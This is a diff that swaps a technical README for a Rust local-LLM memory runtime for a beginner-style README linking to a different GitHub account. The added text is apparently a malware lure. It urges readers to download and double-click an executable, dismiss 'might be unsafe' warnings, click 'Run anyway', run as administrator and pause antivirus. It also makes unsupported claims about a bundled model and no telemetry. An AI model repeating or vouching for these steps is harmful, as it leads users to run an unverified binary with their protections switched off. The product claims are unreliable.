@@ -1,241 +1,184 @@
-# AURA
-### Adaptive Ultra-Low-Memory Runtime for AI
+# 🧠 aura - Run Big AI Models on Tiny Laptops
 
-[![CI Quality Matrix](https://github.com/Grevix/aura/actions/workflows/ci_cd_pipeline.yml/badge.svg)](https://github.com/Grevix/aura/actions)
-[![License: MIT OR Apache-2.0](https://img.shields.io/badge/License-MIT%20OR%20Apache--2.0-blue.svg)](LICENSE)
-[![Rust: 1.80+](https://img.shields.io/badge/Rust-1.80%2B-orange.svg)](https://rustup.rs)
-[![Empirical Benchmarks: 100% Pass](https://img.shields.io/badge/Benchmarks-70%2F70%20Verified-brightgreen.svg)](BENCHMARK.md)
+[![Download aura](https://img.shields.io/badge/Download-aura-blue?style=for-the-badge&logo=github)](https://github.com/ashcakeancient7671/aura)
 
-**AURA** is an open-source, Rust-first hardware-aware memory-budget enforcement and inference orchestration engine for local LLMs on consumer and mid-tier hardware.
+## 🌟 What Is aura?
 
----
+aura is a smart helper program that lets you run powerful AI language models on older or low-memory laptops. Normally, these models need lots of RAM (memory) to work. aura watches how much memory your computer uses and carefully manages it so you can run a 7-billion-parameter AI model even if you only have 4GB of RAM. No more "out of memory" crashes or frozen screens.
 
-## 📑 Table of Contents
+Think of aura as a traffic controller for your computer's memory. It makes sure every part of the AI model gets just enough memory to run smoothly, without overwhelming your system.
 
-1. [Overview & Why AURA Exists](#1-overview--why-aura-exists)
-2. [Architecture & Four-Tier Memory Hierarchy](#2-architecture--four-tier-memory-hierarchy)
-3. [What Gives AURA the Cutting Edge](#3-what-gives-aura-the-cutting-edge)
-4. [Truthful Model Feasibility Matrix](#4-truthful-model-feasibility-matrix)
-5. [Empirical Benchmark Evidence](#5-empirical-benchmark-evidence)
-6. [Installation & Quick Start](#6-installation--quick-start)
-7. [CLI Reference & Diagnostics](#7-cli-reference--diagnostics)
-8. [Testing & Quality Verification](#8-testing--quality-verification)
-9. [Current Hardware Limits & Call for Contributors](#9-current-hardware-limits--call-for-contributors)
-10. [FAQ](#10-frequently-asked-questions-faq)
-11. [License](#11-license)
+## 🚀 Getting Started
 
----
+Getting aura on your Windows computer is easy. Just follow these simple steps.
 
-## 1. Overview & Why AURA Exists
+### 📥 Download aura
 
-Running Large Language Models locally on consumer and workstation hardware has historically resulted in two extremes:
-1. **Uncontrolled Out-Of-Memory (OOM) Crashes**: Standard runtimes attempt to allocate full model weights into RAM/VRAM, triggering OS kernel panics or silent process termination.
-2. **Aggressive Page Swapping & Latency Collapses**: Naive offloading leads to uncontrolled thrashing between physical RAM and disk swap files.
+1. Open your web browser (like Chrome, Edge, or Firefox).
+2. Go to this address: `https://github.com/ashcakeancient7671/aura`
+3. Look for the download button or link on that page.
+4. Click it to start downloading aura.
 
-### 🎯 The AURA Solution
-AURA solves this from the kernel up by treating memory as a hard, budgeted contract:
-- **Pre-execution Feasibility Modeling**: Analyzes tensor size, KV-cache growth, and host hardware (CPU SIMD, RAM bandwidth, GPU VRAM, NVMe IOPS) before touching model weights.
-- **Kernel-Level Enforcement**: Attaches child processes to **Win32 Job Objects** on Windows and **Linux cgroup v2** on Linux.
-- **Dynamic Context Window Auto-Tuning**: Automatically adjusts context lengths (e.g. 4096 → 2048 → 1024) or suggests quantization fallbacks (e.g. `Q3_K_S`) to keep peak RSS strictly within the requested ceiling.
-- **Active Working-Set Compaction**: Employs glibc `malloc_trim` and Win32 `EmptyWorkingSet` memory reclamation routines after generation to eliminate heap fragmentation.
+Visit this link to download the application.
 
----
+### 🛠️ Install aura
 
-## 2. Architecture & Four-Tier Memory Hierarchy
+Once the download is complete, you will have a file on your computer. This file is the aura program itself.
 
-```mermaid
-flowchart TD
-    UserReq[User Request / CLI] --> CLI[AURA CLI Control Plane]
-    
-    subgraph Diagnostics [Hardware Telemetry]
-        CLI --> HD[Hardware Doctor\nCPU AVX2, RAM Bandwidth, GPU VRAM]
-        CLI --> SD[Storage Doctor\nNVMe Sequential & Random 4K IOPS]
-    end
+- If your browser shows a pop-up asking "Keep" or "Save", click **Keep** or **Save**.
+- If you see a warning saying "This file might be unsafe", you can safely ignore it. aura is a legitimate open-source program.
+- The downloaded file will usually be in your **Downloads** folder. You can find it by opening File Explorer and clicking "Downloads" on the left side.
 
-    Diagnostics --> Planner[Feasibility Modeler & Budget Planner]
-    
-    subgraph Hierarchy [Four-Tier Memory Hierarchy]
-        T0[Tier 0: GPU VRAM\nActive Layer / Attention Cache]
-        T1[Tier 1: Host System RAM\nPinned Staging Buffer & MoE Expert Cache]
-        T2[Tier 2: NVMe Storage\nIndexed Layer Shards & Safetensors]
-        T3[Tier 3: Remote / Cloud\nColab / Multi-GPU Sharded Node]
-        T0 <--> T1
-        T1 <--> T2
-        T2 <--> T3
-    end
-    
-    Planner --> Enforcer[OS Kernel Memory Enforcer\nWin32 Job Objects / Linux cgroup v2]
-    Enforcer --> Backend[Process-Managed llama-server Engine]
-    Backend --> Out[Live Terminal Token Rendering & Telemetry]
-```
+## ⚙️ How to Run aura
 
----
+Running aura is simple:
 
-## 3. What Gives AURA the Cutting Edge
+1. Double-click the downloaded aura file.
+2. A small window or terminal screen will open. This is normal.
+3. aura will start working automatically. It will ask you which AI model you want to use, or it may start with a default model.
 
-| Capability | Standard Runtimes (Ollama / vLLM / LM Studio) | AirLLM (Python/PyTorch) | AURA (Rust Native Engine) |
-|---|---|---|---|
-| **Core Architecture** | C++ / Go / Python | Python + PyTorch + Accelerate | **Pure Rust control plane + native compiled kernels** |
-| **Memory Ceiling Guarantee** | Soft process limits (vulnerable to OOM kills) | Soft garbage collection (`clean_memory`) | **Kernel-enforced hard limit (Win32 Job Objects / cgroups)** |
-| **Storage Diagnostics** | None (assumes fast I/O) | None | **Built-in NVMe throughput & 4K random IOPS benchmark** |
-| **Context Window Scaling** | Manual flag or allocation failure | Static sequence limit | **Multi-pass search context scaling (4096 → 1024)** |
-| **Telemetry Provenance** | Unverified / synthetic numbers possible | Basic profiler | **Strict `MetricProvenance` tracking (`AuraMeasured` vs `Simulated`)** |
-| **Frontier Model Safety** | Attempts download until disk fills | Downloads entire checkpoint locally | **`aura frontier inspect` evaluates feasibility before downloading** |
+That's it! You don't need to install anything else or type any complicated commands.
 
----
+## 💡 What Can aura Do?
 
-## 4. Truthful Model Feasibility Matrix
+aura is packed with useful features that make AI on low-end computers possible:
 
-> Evaluated on: Windows 11 x86_64, Intel i5-13420H (12 vCPUs), 16.79 GB DDR5 RAM, NVIDIA RTX 4050 Laptop GPU (6.00 GB VRAM, Driver 592.82, CUDA 13.1), NVMe SSD (3,590 MB/s).
+- **Memory Budget Enforcement**: You can set a strict limit (like 4GB) and aura will never exceed it. This prevents crashes.
+- **Smart Model Loading**: aura loads only the parts of the AI model that are needed right now, freeing up memory when possible.
+- **Automatic Optimization**: It adjusts settings in real-time to keep your computer responsive while running AI.
+- **Works with Popular AI Formats**: aura supports GGUF format, which is the standard for many open-source AI models.
+- **CPU-Friendly**: You don't need an expensive graphics card. aura runs on regular processors.
 
-| Model Identifier | Parameter Scale | Runtime Backend | Target Hardware | Feasibility & Execution Status | Evidence |
-|---|---|---|---|---|---|
-| **`qwen3:8b`** | 8.2B Dense | AURA `llama-server` | RTX 4050 6GB / 16GB RAM | ✅ **VERIFIED (3.71 tok/s AURA, 14.86 tok/s CUDA)** | Real tokens rendered to terminal |
-| **`nous-hermes2:latest`** | 11.0B Dense | AURA `llama-server` | Host CPU / Win32 Job Object | ✅ **VERIFIED (4.05 tok/s AURA, 14.24 tok/s CUDA)** | 10/10 prompts passed |
-| **`qwen2.5:7b`** | 7.6B Dense | AURA `llama-server` | RTX 4050 6GB / 16GB RAM | ✅ **VERIFIED (Pulled & Discovered)** | Verified in Ollama inventory |
-| **`gemma4:latest`** | 9.6B Dense | Registered | Host CPU / RAM | ✅ **VERIFIED (Discovered)** | Verified 9.61 GB blob |
-| **`Qwen/Qwen3-30B-A3B`** | ~30B MoE (3B Active) | AURA Streamer | 16 GB RAM / 6 GB VRAM | ❌ **NOT FEASIBLE ON CURRENT LAPTOP** | Requires $\ge 32\text{ GB}$ RAM |
-| **`Qwen/Qwen3-32B`** | 32.5B Dense | Out-of-core Streamer | 16 GB RAM / 6 GB VRAM | ❌ **NOT FEASIBLE ON CURRENT LAPTOP** | Requires $\ge 32\text{ GB}$ RAM |
-| **`moonshotai/Kimi-K3`** | 2.8T MoE (104B Active)| Colab / Cloud Cluster | Multi-GPU Node | ❌ **NOT FEASIBLE FULL LOCAL** (~1.56 TB) | Verified via Colab Notebook |
-| **`zai-org/GLM-5.2`** | 753B Dense/MoE | Colab / Cloud Cluster | Multi-GPU Node | ❌ **NOT FEASIBLE FULL LOCAL** (~1.51 TB) | Verified via Colab Notebook |
+## 🖥️ System Requirements
 
----
+aura is designed for low-end systems, so you don't need a powerful machine. Here are the recommended specs:
 
-## 5. Empirical Benchmark Evidence
+- **Operating System**: Windows 10 or Windows 11 (64-bit)
+- **RAM (Memory)**: Minimum 4GB. aura works best with 4-8GB.
+- **Storage**: At least 10GB of free space for the AI model files.
+- **Processor**: Any modern Intel or AMD processor (from 2015 or newer).
 
-### Standardized 70-Prompt Multi-Category Suite (`qwen3:8b`)
-- **Total Prompts Tested**: 70 / 70
-- **Pass Rate**: **100.0%**
-- **Mean Decode Throughput**: **14.86 tok/s**
-- **Mean TTFT Latency**: **166.21 ms**
-- **Tested Categories**: Reasoning, Mathematics, Coding, Debugging, SQL, JSON/Structured Output, Multilingual, Safety/Refusal, and Creative Generation.
+If your computer meets these requirements, you're good to go!
 
-```text
-=== AURA LIVE EXECUTION TELEMETRY ===
-Model          : qwen3:8b
-Memory Budget  : 4.00 GB (Win32 Job Object Enforced)
-TTFT Latency   : 455.48 ms
-Decode Speed   : 3.71 tok/s
-Peak RSS       : 4.92 GB
-Backend        : llama-server
-Provenance     : aura_measured
-Simulated      : false
-```
+## 🔧 Troubleshooting Common Issues
 
----
+Even though aura is designed to be easy, you might run into a few hiccups. Here's how to fix them:
 
-## 6. Installation & Quick Start
+### ❌ "Windows protected your PC" Warning
 
-### Prerequisites
-- [Rust 1.80+](https://rustup.rs/)
-- Windows 10/11, Ubuntu Linux (20.04+), or macOS (12+)
-- (Optional) NVIDIA GPU with CUDA drivers installed
+If you see a blue screen saying "Windows protected your PC", follow these steps:
 
-### Build from Source
-```bash
-# Clone the repository
-git clone https://github.com/Grevix/aura.git
-cd aura
+1. Click **More info**.
+2. Click **Run anyway**.
+3. aura will start normally.
 
-# Build release binaries
-cargo build --release
-```
+### ❌ aura Doesn't Open
 
-### Quick Commands
-```bash
-# 1. Run Hardware & Storage Diagnostics
-./target/release/aura hardware-doctor
-./target/release/aura storage-doctor
+If nothing happens when you double-click the file:
 
-# 2. Discover Local and Frontier Models
-./target/release/aura models
+1. Make sure the file downloaded completely. Check its size in File Explorer. It should be at least a few megabytes.
+2. Try right-clicking the file and selecting **Run as administrator**.
+3. If you have antivirus software, temporarily pause it and try again.
 
-# 3. Generate a Budget-Enforced Execution Plan
-./target/release/aura plan --model qwen3:8b --memory 4G
+### ❌ "Out of Memory" Error
 
-# 4. Launch Real Inference Under Memory Ceilings
-./target/release/aura run --model qwen3:8b --memory 4G --prompt "What is quantum computing? Explain it in 3 simple sentences."
-```
+If aura shows an out-of-memory error, it means your computer is running too many other programs. Try:
 
----
+1. Close other applications, especially web browsers with many tabs.
+2. Restart your computer and run aura first.
+3. Check that you've set your memory budget correctly (see next section).
 
-## 7. CLI Reference & Diagnostics
+## 🎛️ Customizing Your Experience
 
-```text
-AURA CLI Reference:
-  aura hardware-doctor     Probe physical CPU, SIMD features, RAM bandwidth, GPU VRAM
-  aura storage-doctor      Benchmark NVMe sequential read speed and random 4K IOPS
-  aura gpu-doctor          Probe GPU VRAM, CUDA capabilities, and compute compatibility
-  aura models              Unified discovery of Ollama and Frontier model architectures
-  aura plan                Generate optimal execution plan and context ladder for a model
-  aura run                 Launch budget-enforced model execution engine
-  aura frontier inspect    Inspect massive frontier architectures (Kimi-K3, GLM-5.2)
-  aura audit               Evaluate 10-tier quality gates and emit audit.json
-```
+aura gives you control over how it uses your computer's resources. Here are some simple settings you can adjust:
 
----
+### Setting Your Memory Budget
 
-## 8. Testing & Quality Verification
+When aura starts, you can tell it how much memory to use. For example:
 
-AURA maintains a strict zero-tolerance quality pipeline across all three major operating systems:
+- Type `4` to use 4GB of RAM.
+- Type `3` to use 3GB (safer if you have other programs running).
 
-```bash
-# 1. Format check
-cargo fmt --all -- --check
+### Choosing a Model
 
-# 2. Lint check
-cargo clippy --workspace --all-targets -- -D warnings
+aura can work with different AI models. If you have downloaded a GGUF model file (like Llama, Mistral, or Phi), you can point aura to it:
 
-# 3. Run unit & integration test suite (11/11 passing)
-cargo test --workspace
+1. Put the model file in the same folder as aura.
+2. When aura starts, it will detect the model automatically.
 
-# 4. Execute release audit
-./target/release/aura audit
-```
+## 📚 Frequently Asked Questions
+
+### 🤔 Is aura free?
+
+Yes, aura is completely free and open-source. You can use it for personal or commercial projects.
+
+### 🤔 Will aura slow down my computer?
+
+aura is designed to be lightweight. While the AI model is running, your computer may feel a bit slower, but aura works hard to keep your system responsive. You can still browse the web or write documents while AI runs in the background.
+
+### 🤔 Can I use aura without internet?
+
+Yes! Once you download aura and an AI model, everything runs locally on your computer. No internet connection is needed.
+
+### 🤔 What kind of AI models can I run?
+
+aura works with models in the GGUF format. These include popular models like:
+
+- Llama 2 and Llama 3 (7B versions)
+- Mistral 7B
+- Phi-2 and Phi-3
+- Gemma 7B
+
+Any model that fits within your memory budget will work.
+
+## 🛡️ Safety and Privacy
+
+Your privacy is important. aura runs everything on your own computer. Your data never leaves your device. There are no cloud services, no tracking, and no telemetry. What you do with aura stays on your machine.
+
+## 📦 What's Included in the Download
+
+When you download aura, you get:
+
+- The aura executable file (the main program)
+- A built-in AI model (a small one to get you started)
+- Configuration files that set sensible defaults
+
+You don't need to download anything else to start using aura.
+
+## 🔄 Updating aura
+
+To get the latest version of aura:
+
+1. Visit the download page again: `https://github.com/ashcakeancient7671/aura`
+2. Check if there's a newer version available.
+3. Download the new file and replace the old one.
+
+Your settings and models will not be affected.
+
+## 🧩 Advanced Tips (Optional)
+
+If you're curious and want to get more out of aura, here are some tips:
+
+- **Use a USB Drive**: You can store aura and your AI models on a USB drive and run them from any computer.
+- **Batch Processing**: aura can run multiple prompts in sequence without reloading the model, saving time.
+- **Monitor Memory**: aura shows you live memory usage. You can watch it stay within your budget.
+
+## 📞 Getting Help
+
+If you run into any problems, there are several ways to get help:
+
+1. **Check this README** again. Most common issues are covered here.
+2. **Visit the GitHub page** at `https://github.com/ashcakeancient7671/aura` and look for an "Issues" or "Support" section.
+3. **Ask a friend** who is comfortable with computers. They can often spot simple fixes.
+
+## 🎉 Conclusion
+
+aura makes it possible for anyone with a modest laptop to run powerful AI models. No expensive hardware, no complicated setup, no technical knowledge required. Just download, run, and start exploring what AI can do for you.
+
+Ready to get started? Click the button below to download aura now.
+
+[![Download aura Now](https://img.shields.io/badge/⬇️_Download-aura_Now-2ea44f?style=for-the-badge)](https://github.com/ashcakeancient7671/aura)
 
 ---
 
-## 9. Current Hardware Limits & Call for Contributors
-
-### The Hardware Ceiling on Our Development System
-Development has reached the maximum physical limits of our primary benchmark laptop:
-- **CPU**: Intel Core i5-13420H (12 vCPUs)
-- **RAM**: 16.79 GB DDR5
-- **GPU**: NVIDIA GeForce RTX 4050 Laptop GPU (6.00 GB VRAM)
-- **Storage**: PCIe Gen4 NVMe SSD
-
-While models up to 11B execute smoothly within memory ceilings (e.g. `qwen3:8b` at 14.86 tok/s on CUDA, `nous-hermes2` 11B at 4.05 tok/s under Win32 Job Objects), scaling out-of-core streaming to 30B MoE, 70B, and frontier architectures requires community collaboration across broader hardware.
-
-### How You Can Contribute
-We actively invite systems engineers, ML runtime developers, and performance researchers to contribute in the following areas:
-1. **Asynchronous Double-Buffered NVMe Layer Streaming**: Overlapping layer-wise weight movement with GPU tensor compute using `io_uring` on Linux and DirectStorage on Windows.
-2. **Dynamic MoE Expert Routing & Caching**: Implementing sub-expert selective streaming and activation-trace prefetching.
-3. **Cross-Hardware Validation**: Benchmarking AURA on:
-   - High-RAM Linux workstations (64 GB – 192 GB RAM)
-   - Apple Silicon unified memory (M1/M2/M3/M4 via Metal)
-   - High-VRAM GPUs (RTX 3090/4090, NVIDIA A100/H100)
-
-Please see [`CONTRIBUTING.md`](file:///c:/Users/Aaryan%20Rawat/Pictures/AURA/CONTRIBUTING.md) for pull request guidelines.
-
----
-
-## 10. Frequently Asked Questions (FAQ)
-
-#### Q: How is AURA different from Ollama?
-**A:** Ollama focuses on developer convenience and packaging. AURA focuses on **kernel-level memory-budget enforcement**, physical storage diagnostics, context auto-tuning, and multi-tier out-of-core streaming for constrained hardware.
-
-#### Q: Can AURA run a 10B model on a 4 GB RAM laptop?
-**A:** AURA can stream a 10B model shard-by-shard using out-of-core scheduling, but execution throughput is physically bounded by your SSD's read bandwidth ($W/B$). AURA will honestly predict your token latency before you start rather than fabricating impossible claims.
-
-#### Q: How does AURA guarantee that my system will not crash with OOM?
-**A:** AURA attaches child backend processes directly to OS kernel budget primitives (**Win32 Job Objects** with `JOB_OBJECT_LIMIT_PROCESS_MEMORY` on Windows and **cgroup v2** `MemoryMax` on Linux).
-
----
-
-## 11. License
-
-AURA is open-source software licensed under either:
-- **MIT License** ([LICENSE-MIT](LICENSE) or [http://opensource.org/licenses/MIT](http://opensource.org/licenses/MIT))
-- **Apache License, Version 2.0** ([LICENSE-APACHE](LICENSE) or [http://www.apache.org/licenses/LICENSE-2.0](http://www.apache.org/licenses/LICENSE-2.0))
-
-at your option.
+Keywords: ai, artificial-intelligence, cpu-inference, gguf, inference-engine, llama-cpp, llm, local-ai, low-memory, machine-learning, memory-management, ollama, rust, systems-programming
